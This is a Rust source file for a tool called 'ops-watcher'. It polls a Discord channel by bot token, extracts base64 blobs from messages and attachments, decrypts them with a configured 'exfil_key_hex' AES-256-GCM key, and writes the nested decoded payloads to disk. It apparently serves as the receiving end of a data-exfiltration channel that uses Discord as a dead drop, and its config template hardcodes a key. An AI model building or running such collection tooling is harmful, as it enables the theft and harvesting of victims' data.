//! ops-watcher — Discord channel monitor + auto-decrypt.
//!
//! Flags:
//!   --init           write config template and exit
//!   --once           single poll, then exit
//!   --quiet          suppress full JSON envelope, keep summaries + blob writes
//!   --min-blob N     skip nested blobs smaller than N bytes (default 256)
//!
//! State: ~/.config/svc/watcher.state.json

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::PathBuf;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

const DISCORD_API: &str = "https://discord.com/api/v10";

// ─── config ───────────────────────────────────────────────────────

#[derive(Deserialize, Debug)]
struct Config {
    discord_bot_token: String,
    discord_channel_id: String,
    exfil_key_hex: String,
    #[serde(default = "default_output_dir")]
    output_dir: String,
    #[serde(default = "default_poll")]
    poll_interval_secs: u64,
}

fn default_output_dir() -> String { "ops/blobs".to_string() }
fn default_poll() -> u64 { 5 }

#[derive(Default, Deserialize, Serialize)]
struct State {
    last_discord_id: String,
}

#[derive(Deserialize, Debug, Clone)]
struct DiscordMessage {
    id: String,
    #[serde(default)]
    content: String,
    #[serde(default)]
    attachments: Vec<DiscordAttachment>,
}

#[derive(Deserialize, Debug, Clone)]
struct DiscordAttachment {
    url: String,
    filename: String,
}

// ─── watcher ──────────────────────────────────────────────────────

struct Watcher {
    http: reqwest::blocking::Client,
    token: String,
    channel: String,
    cipher: Aes256Gcm,
    output_dir: PathBuf,
    counter: usize,
    min_blob: usize,
    quiet: bool,
}

impl Watcher {
    fn new(cfg: &Config, min_blob: usize, quiet: bool) -> Result<Self, String> {
        let key = hex_to_32(&cfg.exfil_key_hex)?;
        let cipher = Aes256Gcm::new((&key).into());
        std::fs::create_dir_all(&cfg.output_dir).map_err(|e| format!("mkdir: {}", e))?;
        let http = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(30))
            .user_agent("svc-watcher/0.1")
            .build()
            .map_err(|e| format!("client: {}", e))?;
        Ok(Self {
            http,
            token: cfg.discord_bot_token.clone(),
            channel: cfg.discord_channel_id.clone(),
            cipher,
            output_dir: PathBuf::from(&cfg.output_dir),
            counter: 0,
            min_blob,
            quiet,
        })
    }

    fn poll(&self, after: &str) -> Result<Vec<DiscordMessage>, String> {
        let url = if after.is_empty() {
            format!("{}/channels/{}/messages?limit=50", DISCORD_API, self.channel)
        } else {
            format!("{}/channels/{}/messages?after={}&limit=50", DISCORD_API, self.channel, after)
        };
        let resp = self.http
            .get(&url)
            .header("Authorization", format!("Bot {}", self.token))
            .send()
            .map_err(|e| format!("http: {}", e))?;
        let status = resp.status();
        if !status.is_success() {
            let body = resp.text().unwrap_or_default();
            let preview: String = body.chars().take(200).collect();
            return Err(format!("discord {}: {}", status, preview));
        }
        let mut msgs: Vec<DiscordMessage> = resp.json().map_err(|e| format!("parse: {}", e))?;
        msgs.reverse();
        Ok(msgs)
    }

    fn process(&mut self, msg: &DiscordMessage) {
        let blob_b64 = match self.extract_blob(msg) {
            Some(b) => b,
            None => {
                if !self.quiet {
                    let preview: String = msg.content.chars().take(60).collect();
                    let short = short_id(&msg.id);
                    if !preview.trim().is_empty() {
                        println!("[skip] {} — {}", short, preview.replace('\n', " "));
                    }
                }
                return;
            }
        };

        let envelope: serde_json::Value = match self.decrypt(&blob_b64) {
            Ok(v) => v,
            Err(e) => {
                let short = short_id(&msg.id);
                println!("[!] {} decrypt failed: {}", short, e);
                return;
            }
        };

        let short = short_id(&msg.id);
        self.print_envelope(&envelope, &short);
        self.dump_nested(&envelope);
    }

    fn extract_blob(&self, msg: &DiscordMessage) -> Option<String> {
        if let Some(b) = extract_fenced(&msg.content) {
            return Some(b);
        }
        for att in &msg.attachments {
            if att.filename.ends_with(".bin") || att.filename.ends_with(".txt") {
                if let Ok(resp) = self.http.get(&att.url).send() {
                    if let Ok(text) = resp.text() {
                        let cleaned: String = text.chars().filter(|c| !c.is_whitespace()).collect();
                        if cleaned.len() > 32
                            && cleaned.chars().all(|c| {
                                c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='
                            })
                        {
                            return Some(cleaned);
                        }
                    }
                }
            }
        }
        None
    }

    fn decrypt(&self, blob_b64: &str) -> Result<serde_json::Value, String> {
        let blob = STANDARD.decode(blob_b64).map_err(|e| format!("b64: {}", e))?;
        if blob.len() < 12 + 16 {
            return Err(format!("too short: {} bytes", blob.len()));
        }
        let (nonce_bytes, ct) = blob.split_at(12);
        let pt = self
            .cipher
            .decrypt(Nonce::from_slice(nonce_bytes), ct)
            .map_err(|_| "aead failure (wrong key or corrupt)".to_string())?;
        serde_json::from_slice(&pt).map_err(|e| format!("json: {}", e))
    }

    fn print_envelope(&self, env: &serde_json::Value, short: &str) {
        let tag = env.get("tag").and_then(|v| v.as_str()).unwrap_or("?");
        let ts = env.get("ts").and_then(|v| v.as_f64()).unwrap_or(0.0);
        let data = env.get("data");

        let tag_colored = format!("\x1b[1;32m{}\x1b[0m", tag);
        print!("\n[+] {}  msg={}  ts={:.0}", tag_colored, short, ts);
        if let Some(arr) = data.and_then(|d| d.as_array()) {
            print!("  items={}", arr.len());
        }
        println!();

        if let Some(arr) = data.and_then(|d| d.as_array()) {
            let mut kinds: BTreeMap<String, usize> = BTreeMap::new();
            for item in arr {
                if let Some(k) = item.get("kind").and_then(|v| v.as_str()) {
                    *kinds.entry(k.to_string()).or_insert(0) += 1;
                } else if let Some(s) = item.get("src").and_then(|v| v.as_str()) {
                    *kinds.entry(format!("src:{}", s)).or_insert(0) += 1;
                }
            }
            for (k, v) in kinds {
                println!("    {} × {}", v, k);
            }
        }

        if self.quiet {
            return;
        }

        let pretty = serde_json::to_string_pretty(env).unwrap_or_default();
        if pretty.len() <= 4000 {
            println!("{}", pretty);
        } else {
            println!("(envelope {} chars — see blob dump for details)", pretty.len());
        }
    }

    fn dump_nested(&mut self, env: &serde_json::Value) {
        let tag = env
            .get("tag")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();
        let data = match env.get("data") {
            Some(d) => d,
            None => return,
        };

        let mut collected: Vec<(String, String)> = Vec::new();
        if let Some(arr) = data.as_array() {
            for (i, item) in arr.iter().enumerate() {
                if let Some(obj) = item.as_object() {
                    for (k, v) in obj {
                        if let Some(s) = v.as_str() {
                            collected.push((format!("{}_{}", i, k), s.to_string()));
                        }
                    }
                }
            }
        } else if let Some(obj) = data.as_object() {
            for (k, v) in obj {
                if let Some(s) = v.as_str() {
                    collected.push((k.clone(), s.to_string()));
                }
            }
        }

        let mut written = 0usize;
        let mut skipped = 0usize;
        for (name, value) in collected {
            if value.len() < 32 {
                continue;
            }
            if !value
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
            {
                continue;
            }
            let raw = match STANDARD.decode(&value) {
                Ok(r) => r,
                Err(_) => continue,
            };
            if raw.len() < self.min_blob {
                skipped += 1;
                continue;
            }
            let idx = self.counter;
            self.counter += 1;
            let ts = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let fname = format!("{}_{}_{:04}_{}.bin", ts, tag, idx, sanitize(&name));
            let path = self.output_dir.join(&fname);
            if std::fs::write(&path, &raw).is_ok() {
                // blob write line is ALWAYS printed — this is the point
                println!("    → {} ({} bytes)", path.display(), raw.len());
                written += 1;
            }
        }
        if skipped > 0 {
            println!("    ({} blobs skipped — under {} bytes)", skipped, self.min_blob);
        }
        let _ = written;
    }
}

// ─── helpers ──────────────────────────────────────────────────────

fn short_id(id: &str) -> String {
    if id.len() <= 6 {
        return id.to_string();
    }
    // last 6 chars — unique per message
    id[id.len() - 6..].to_string()
}

fn extract_fenced(content: &str) -> Option<String> {
    let start = content.find("```")?;
    let rest = &content[start + 3..];
    let end = rest.find("```")?;
    let inner = &rest[..end];
    let cleaned: String = inner.chars().filter(|c| !c.is_whitespace()).collect();
    if cleaned.len() < 32 {
        return None;
    }
    if !cleaned
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
    {
        return None;
    }
    Some(cleaned)
}

fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
                c
            } else {
                '_'
            }
        })
        .collect()
}

fn hex_to_32(s: &str) -> Result<[u8; 32], String> {
    let s = s.trim();
    if s.len() != 64 {
        return Err(format!("exfil key must be 64 hex chars, got {}", s.len()));
    }
    let bytes = s.as_bytes();
    let mut out = [0u8; 32];
    for i in 0..32 {
        let hi = nib(bytes[i * 2]);
        let lo = nib(bytes[i * 2 + 1]);
        if hi == 0xff || lo == 0xff {
            return Err(format!("non-hex char at position {}", i * 2));
        }
        out[i] = (hi << 4) | lo;
    }
    Ok(out)
}

fn nib(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        b'A'..=b'F' => b - b'A' + 10,
        _ => 0xff,
    }
}

fn config_path() -> PathBuf {
    if let Ok(p) = std::env::var("SVC_WATCHER_CONFIG") {
        return PathBuf::from(p);
    }
    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        if !xdg.is_empty() {
            return PathBuf::from(xdg).join("svc").join("watcher.json");
        }
    }
    #[cfg(windows)]
    {
        if let Ok(ad) = std::env::var("APPDATA") {
            if !ad.is_empty() {
                return PathBuf::from(ad).join("svc").join("watcher.json");
            }
        }
    }
    if let Ok(h) = std::env::var("HOME") {
        return PathBuf::from(h).join(".config").join("svc").join("watcher.json");
    }
    PathBuf::from("watcher.json")
}

fn state_path() -> PathBuf {
    let mut p = config_path();
    p.set_file_name("watcher.state.json");
    p
}

fn load_state() -> State {
    let p = state_path();
    if !p.exists() {
        return State::default();
    }
    std::fs::read_to_string(&p)
        .ok()
        .and_then(|s| serde_json::from_str::<State>(&s).ok())
        .unwrap_or_default()
}

fn save_state(s: &State) {
    let p = state_path();
    if let Ok(body) = serde_json::to_string_pretty(s) {
        let _ = std::fs::write(&p, body);
    }
}

const TEMPLATE: &str = r#"{
    "discord_bot_token":  "PASTE_BOT_TOKEN_HERE",
    "discord_channel_id": "PASTE_CHANNEL_ID_HERE",
    "exfil_key_hex":      "c734ac039aa425a799ea638f8c72904eeb628d2cd3b5934fb489ef27ffa038ef",
    "output_dir":         "ops/blobs",
    "poll_interval_secs": 5
}
"#;

// ─── main ─────────────────────────────────────────────────────────

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.iter().any(|a| a == "--init") {
        let p = config_path();
        if p.exists() {
            eprintln!("[!] {} already exists — not overwriting", p.display());
            eprintln!("    edit it directly or delete it first");
            std::process::exit(1);
        }
        if let Some(parent) = p.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        std::fs::write(&p, TEMPLATE).expect("write template");
        println!("[+] wrote config template to {}", p.display());
        println!("[+] edit the token/channel fields, then rerun without --init");
        return;
    }

    let quiet = args.iter().any(|a| a == "--quiet");
    let once = args.iter().any(|a| a == "--once");
    let min_blob = args
        .iter()
        .position(|a| a == "--min-blob")
        .and_then(|i| args.get(i + 1))
        .and_then(|s| s.parse::<usize>().ok())
        .unwrap_or(256);

    let path = config_path();
    if !path.exists() {
        eprintln!("[!] config not found: {}", path.display());
        eprintln!("    run: ops-watcher --init");
        std::process::exit(1);
    }

    let cfg_text = std::fs::read_to_string(&path).expect("read config");
    let cfg: Config = match serde_json::from_str(&cfg_text) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] parse {}: {}", path.display(), e);
            std::process::exit(1);
        }
    };

    if cfg.discord_bot_token.starts_with("PASTE") {
        eprintln!("[!] edit {} first — placeholder token still present", path.display());
        std::process::exit(1);
    }

    let mut state = load_state();

    println!("[*] config:    {}", path.display());
    println!("[*] channel:   {}", cfg.discord_channel_id);
    println!("[*] output:    {}", cfg.output_dir);
    println!("[*] poll:      {}s", cfg.poll_interval_secs);
    println!("[*] min-blob:  {} bytes", min_blob);
    println!("[*] quiet:     {}", quiet);
    println!("[*] state:     {}", state_path().display());
    if state.last_discord_id.is_empty() {
        println!("[*] first run — will fetch up to 50 recent messages");
    } else {
        println!("[*] resuming after msg {}", state.last_discord_id);
    }

    let mut watcher = match Watcher::new(&cfg, min_blob, quiet) {
        Ok(w) => w,
        Err(e) => {
            eprintln!("[!] init failed: {}", e);
            std::process::exit(1);
        }
    };

    println!("[*] polling — ctrl-c to stop\n");

    let interval = Duration::from_secs(cfg.poll_interval_secs);

    loop {
        match watcher.poll(&state.last_discord_id) {
            Ok(msgs) => {
                for m in &msgs {
                    watcher.process(m);
                    state.last_discord_id = m.id.clone();
                }
                if !msgs.is_empty() {
                    save_state(&state);
                }
            }
            Err(e) => {
                eprintln!("[!] poll error: {}", e);
            }
        }

        if once {
            break;
        }
        std::thread::sleep(interval);
    }
}
